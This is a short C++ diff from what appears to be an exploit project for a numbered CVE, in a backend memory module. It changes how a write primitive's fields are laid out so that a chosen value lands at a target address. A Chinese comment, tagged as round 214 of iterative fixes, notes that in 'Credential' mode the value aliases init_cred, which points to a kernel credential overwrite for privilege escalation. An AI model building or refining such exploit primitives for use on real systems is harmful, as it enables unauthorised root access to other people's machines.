@@ -25,10 +25,13 @@ namespace ghostlock::backend::cve_2026_43499::memory {
         }
         const std::uint64_t backstep = static_cast<std::uint64_t>(pointer_bytes);
         if (request.preserve_child) {
-            /* Aimed at the value: the left field carries the target so the write
-             * lands on it. */
-            arm.pc = value;
-            arm.left = request.target;
+            /* ★★ 第 214 轮 ✓（权威 `origin/main` 同形 ✓）：`preserve_child` 时应为
+             *  **`pc = target − backstep`** ✓（= `payload_write_layout` 的 `parent` ✓）、
+             *  **`right = value`** ✓（= `layout.right`，Credential 时即 `init_cred` 别名 ✓）、**`left = 0`** ✓；
+             *  原先写 `pc = value` / `left = target` ✗ ⇒ 与固定向量**相反** ⇒ 错的落格 ✗。 */
+            arm.pc = request.target >= backstep ? request.target - backstep : 0U;
+            arm.right = value;
+            arm.left = 0U;
             return arm;
         }
         /* Aimed at the target itself, with both side fields zero: this is the arm
